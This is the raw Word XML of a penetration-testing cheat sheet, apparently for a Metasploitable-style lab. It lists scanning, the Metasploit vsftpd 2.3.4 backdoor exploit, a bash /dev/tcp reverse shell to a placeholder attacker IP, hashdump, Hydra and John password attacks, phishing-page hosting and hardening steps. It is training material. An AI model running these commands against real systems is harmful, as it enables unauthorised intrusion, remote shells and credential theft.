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Penetration Testing Commands Documentation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>netdiscover</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Scanning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>nmap -A &lt;target_ip&gt;</w:t>
        <w:br/>
        <w:t>nmap -sS -sV -O &lt;target_ip&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Exploitation (Metasploit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>msfconsole</w:t>
        <w:br/>
        <w:t>search vsftpd</w:t>
        <w:br/>
        <w:t>use exploit/unix/ftp/vsftpd_234_backdoor</w:t>
        <w:br/>
        <w:t>set RHOST &lt;target_ip&gt;</w:t>
        <w:br/>
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Reverse Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t># Attacker</w:t>
        <w:br/>
        <w:t>nc -lvnp 4444</w:t>
        <w:br/>
        <w:br/>
        <w:t># Target</w:t>
        <w:br/>
        <w:t>bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Post-Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>sysinfo</w:t>
        <w:br/>
        <w:t>hashdump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Password Attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t># Hydra</w:t>
        <w:br/>
        <w:t>hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://&lt;target_ip&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># John the Ripper</w:t>
        <w:br/>
        <w:t>nano hashes.txt</w:t>
        <w:br/>
        <w:t>john hashes.txt</w:t>
        <w:br/>
        <w:t>john --show hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Social Engineering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>mkdir phishing-page</w:t>
        <w:br/>
        <w:t>cd phishing-page</w:t>
        <w:br/>
        <w:t>nano index.html</w:t>
        <w:br/>
        <w:t>python3 -m http.server 8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Malware Basics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>strings sample_file</w:t>
        <w:br/>
        <w:t>file sample_file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. System Hardening</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>sudo apt update &amp;&amp; sudo apt upgrade</w:t>
        <w:br/>
        <w:t>sudo ufw enable</w:t>
        <w:br/>
        <w:t>sudo ufw deny 21</w:t>
        <w:br/>
        <w:t>netstat -tulnp</w:t>
        <w:br/>
        <w:t>sudo systemctl stop &lt;service_name&gt;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